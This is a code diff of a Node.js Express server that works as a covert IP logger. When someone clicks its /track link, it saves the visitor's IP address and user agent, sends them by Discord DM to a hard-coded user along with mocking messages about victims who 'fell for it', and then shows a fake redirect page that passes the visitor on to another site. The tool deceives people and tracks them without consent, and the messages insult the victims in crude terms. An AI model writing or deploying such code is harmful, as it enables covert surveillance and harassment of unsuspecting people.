@@ -4,32 +4,28 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const LOG_FILE = "visits.json";
 
-// ============================================================
 const BOT_TOKEN = process.env.TOKEN;
 const YOUR_DISCORD_USER_ID = "1473465013946552362";
-// ============================================================
 
 if (!fs.existsSync(LOG_FILE)) {
   fs.writeFileSync(LOG_FILE, JSON.stringify([]));
 }
 
 const dmMessages = [
-  `bro someone actually clicked it 💀 they cooked`,
-  `LMAOO another one fell for it 🔥`,
-  `bro really said lemme click this link 💀💀`,
-  `caught in 4k no cap 😭🔥`,
+  `that bitch fell for it`,
+  `omgadd look at ts d0mbasss`,
+  `omgadd c00l fe bipazz nah gng look wht happen`,
+  `caught ip logged ahh`,
   `they really said bet and clicked it 💀`,
   `anotha one 🎉 they had no idea lmaooo`,
-  `bro walking into the trap rn 😭😭`,
-  `nah they really clicked it on god 💀🔥`,
+  `bro walking into the trap rn  when its right fucking infront of u`,
+  `fuck them whyd they click it lolll`,
 ];
 
 async function sendDM(ip, userAgent, totalHits, time) {
   try {
     const { default: fetch } = await import("node-fetch");
-
     const randomMsg = dmMessages[Math.floor(Math.random() * dmMessages.length)];
-
     const message =
       `${randomMsg}\n\n` +
       `**ip:** \`${ip}\`\n` +
@@ -73,13 +69,11 @@ app.get("/track", (req, res) => {
   });
 
   const visit = { ip, userAgent, timestamp };
-
   const visits = JSON.parse(fs.readFileSync(LOG_FILE));
   visits.push(visit);
   fs.writeFileSync(LOG_FILE, JSON.stringify(visits, null, 2));
 
   console.log(`[VISIT] bro really clicked it 💀 — ip: ${ip} — ${timestamp}`);
-
   sendDM(ip, userAgent, visits.length, time);
 
   res.send(`
@@ -111,23 +105,18 @@ app.get("/track", (req, res) => {
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         p { font-size: 16px; color: #aaa; }
+        h2 { font-size: 20px; color: white; text-align: center; padding: 0 20px; }
         #countdown { color: white; font-weight: bold; }
       </style>
     </head>
     <body>
+      <h2>dont worry we are getting u to the website where alot of requires happen!</h2>
       <div class="spinner"></div>
-      <p>Redirecting in <span id="countdown">3</span> seconds...</p>
+      <p>Redirecting in <span id="countdown">1.5</span> seconds...</p>
       <script>
-        let t = 3;
-        const el = document.getElementById("countdown");
-        const iv = setInterval(() => {
-          t--;
-          el.textContent = t;
-          if (t <= 0) {
-            clearInterval(iv);
-            window.location.href = "https://www.youtube.com";
-          }
-        }, 1000);
+        setTimeout(() => {
+          window.location.href = "https://requirehubv2.pythonanywhere.com";
+        }, 1500);
       </script>
     </body>
     </html>
@@ -139,7 +128,7 @@ app.get("/visits", (req, res) => {
   res.json(visits);
 });
 
-app.get("/", (req, res) => res.send("servers up no cap ✅"));
+app.get("/", (req, res) => res.send("servers up no cap  ngl"));
 
 app.listen(PORT, () => {
   console.log(`server running on port ${PORT} lets goooo 🔥`);
